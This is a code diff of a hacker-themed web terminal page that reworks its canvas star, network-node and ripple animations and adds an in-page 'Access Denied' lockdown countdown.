+          for(let i=0; i<numNodes; i++) netNodes.push({ x: Math.random()*netCanvas.width, y: Math.random()*netCanvas.height, r: 1.5, dx: (Math.random() - 0.5) * 0.4, dy: (Math.random() - 0.5) * 0.4 });
+
+          const numDust = isMobile ? 40 : 100;
+          for(let i=0; i<numDust; i++) dust.push({ x: Math.random()*starCanvas.width, y: Math.random()*starCanvas.height, s: Math.random()*0.8 + 0.1, dy: Math.random()*0.5 + 0.1 });
+        }
+        
+        function drawC() {
+          if (!sCtx || !nCtx) return;
+          sCtx.clearRect(0,0,starCanvas.width, starCanvas.height); nCtx.clearRect(0,0,netCanvas.width, netCanvas.height);
+          
+          if (analyser) {
+              analyser.getByteFrequencyData(dataArray);
+              let sum = 0;
+              for(let i = 0; i < 8; i++) sum += dataArray[i];
+              audioPulseValue = sum / (8 * 255);
+              document.documentElement.style.setProperty('--audio-pulse', audioPulseValue);
+          }
+
+          currentTiltX += (targetTiltX - currentTiltX) * 0.05;
+          currentTiltY += (targetTiltY - currentTiltY) * 0.05;
+
+          if (termContainer) termContainer.style.transform = `translate(${currentTiltX * -1}px, ${currentTiltY * -1}px)`;
+          starCanvas.style.transform = `translate(${currentTiltX * 0.5}px, ${currentTiltY * 0.5}px)`;
+          netCanvas.style.transform = `translate(${currentTiltX * 1.2}px, ${currentTiltY * 1.2}px)`;
+
+          const unlocked = document.body.classList.contains('theme-unlocked');
+          const baseStarColor = unlocked ? [255, 102, 178] : [0, 229, 255]; 
+          const baseNetColor = unlocked ? "255, 102, 178" : "0, 229, 255"; 
+          
+          dust.forEach(d => {
+              sCtx.fillStyle = `rgba(255,255,255,0.3)`; sCtx.beginPath(); sCtx.arc(d.x, d.y, d.s, 0, Math.PI*2); sCtx.fill();
+              d.y -= d.dy; if(d.y < 0) d.y = starCanvas.height;
+          });
+
+          stars.forEach(s => { 
+              let twinkle = Math.sin(s.t)*0.5+0.5; let alpha = twinkle * (s.z * 0.6 + 0.2);
+              sCtx.fillStyle = `rgba(${baseStarColor[0]}, ${baseStarColor[1]}, ${baseStarColor[2]}, ${alpha})`; 
+              sCtx.beginPath(); sCtx.arc(s.x, s.y, (s.r * (s.z * 0.5 + 0.5)) + (audioPulseValue * 0.8), 0, Math.PI*2); sCtx.fill(); 
+              s.t += s.ts; s.y -= (s.z * 0.1 + 0.02); if(s.y < -10) s.y = starCanvas.height + 10;
+          });
+
+          nCtx.lineWidth = 0.8;
+          netNodes.forEach(n => {
+              n.x += n.dx; n.y += n.dy; 
+              if(n.x < 0 || n.x > netCanvas.width) n.dx *= -1; 
+              if(n.y < 0 || n.y > netCanvas.height) n.dy *= -1;
+              
+              let dxMouse = mouse.x - n.x; let dyMouse = mouse.y - n.y; let distMouse = Math.sqrt(dxMouse*dxMouse + dyMouse*dyMouse);
+              if (distMouse < 180) {
+                  n.x += dxMouse * 0.015; n.y += dyMouse * 0.015;
+                  nCtx.strokeStyle = `rgba(${baseNetColor}, ${(1 - distMouse/180) * 0.5})`;
+                  nCtx.beginPath(); nCtx.moveTo(n.x, n.y); nCtx.lineTo(mouse.x, mouse.y); nCtx.stroke();
+              }
+              nCtx.fillStyle = `rgba(${baseNetColor}, 0.6)`; nCtx.beginPath(); nCtx.arc(n.x, n.y, n.r, 0, Math.PI*2); nCtx.fill();
+          });
+          
+          for(let i=0; i<netNodes.length; i++) {
+              for(let j=i+1; j<netNodes.length; j++) {
+                  let dx = netNodes[i].x - netNodes[j].x; let dy = netNodes[i].y - netNodes[j].y; let dist = Math.sqrt(dx*dx + dy*dy);
+                  if(dist < 120) {
+                      let opacity = (1 - dist/120) * 0.3; nCtx.strokeStyle = `rgba(${baseNetColor}, ${opacity})`;
+                      nCtx.beginPath(); nCtx.moveTo(netNodes[i].x, netNodes[i].y); nCtx.lineTo(netNodes[j].x, netNodes[j].y); nCtx.stroke();
+                  }
+              }
+          }
+
+          ripples.forEach((rip, index) => {
+              rip.r += 3; rip.alpha -= 0.02;
+              if(rip.alpha <= 0) ripples.splice(index, 1);
+              else {
+                  nCtx.strokeStyle = `rgba(${baseNetColor}, ${rip.alpha})`;
+                  nCtx.lineWidth = 1.5; nCtx.beginPath(); nCtx.arc(rip.x, rip.y, rip.r, 0, Math.PI*2); nCtx.stroke();
+              }
+          });
+
+          requestAnimationFrame(drawC);
+        }
+        
+        initMatrix(); requestAnimationFrame(drawMatrix); 
+        window.addEventListener('resize', () => { initMatrix(); initC(); });
+        initC(); drawC();
+
+        // OPTION 10: Red Access Denied Flash added to Lockdown Trigger
+        function triggerLockdown() { 
+            document.getElementById('flash-overlay').classList.add('flash-active');
+            const end = Date.now() + 18000000; safeSetLock(end); enforceLockdown(end); 
+        }
+
+        function enforceLockdown(end) {
+          hideInput(); document.getElementById('lock-screen').classList.add('active');
+          const timerInterval = setInterval(() => {
+            const rem = end - Date.now(); 
+            if (rem <= 0) { clearInterval(timerInterval); safeClearLock(); location.reload(); return; }
+            const h = Math.floor(rem / 3600000).toString().padStart(2,'0'); const m = Math.floor((rem % 3600000) / 60000).toString().padStart(2,'0'); const s = Math.floor((rem % 60000) / 1000).toString().padStart(2,'0');
+            document.getElementById('timer').innerText = `${h}:${m}:${s}`;
+          }, 1000);
+        }
+        function showInput() { 
+            inputContainer.style.display = "flex"; 
+            inputField.focus(); 
+            setTimeout(() => { termBody.scrollTop = termBody.scrollHeight; }, 100);
+        }
+        function hideInput() { inputContainer.style.display = "none"; }
     }
 
-    function showInput() { 
-        inputContainer.style.display = "flex"; 
-        inputField.focus(); 
-        setTimeout(() => termBody.scrollTop = termBody.scrollHeight, 100);
+    // Safely trigger ONLY ONE TIME
+    if (document.readyState === 'complete' || document.readyState === 'interactive') { 
+        setTimeout(runApp, 100); 
+    } else { 
+        document.addEventListener('DOMContentLoaded', runApp); 
+        window.addEventListener('load', runApp); 
     }
-    function hideInput() { inputContainer.style.display = "none"; }
-
-    // --- ENHANCED MATRIX RAIN ---
-    const canvas = document.getElementById('matrix-canvas');
-    const ctx = canvas.getContext('2d');
-    
-    function resizeCanvas() {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-    }
-    resizeCanvas();
-    window.addEventListener('resize', resizeCanvas);
-
-    const letters = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%&*<>[]{}";
-    const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const drops = [];
-    for(let x = 0; x < columns; x++) drops[x] = Math.random() * -100;
-
-    function drawMatrix() {
-      ctx.fillStyle = "rgba(0, 0, 0, 0.15)";
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      
-      const isPrank = document.body.classList.contains('prank-active');
-      ctx.fillStyle = isPrank ? "#ff003c" : "#00f3ff";
-      ctx.shadowBlur = 8;
-      ctx.shadowColor = isPrank ? "#ff003c" : "#00f3ff";
-      ctx.font = "bold " + fontSize + "px 'JetBrains Mono'";
-
-      for(let i = 0; i < drops.length; i++) {
-        const text = letters.charAt(Math.floor(Math.random() * letters.length));
-        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-        if(drops[i] * fontSize > canvas.height && Math.random() > 0.97) drops[i] = 0;
-        drops[i]++;
-      }
-      requestAnimationFrame(drawMatrix);
-    }
-    drawMatrix();
-
-    document.body.addEventListener('click', (e) => { 
-        if(e.target.tagName !== "INPUT" && inputContainer.style.display === "flex") inputField.focus(); 
-    });
   </script>
 </body>
 </html>
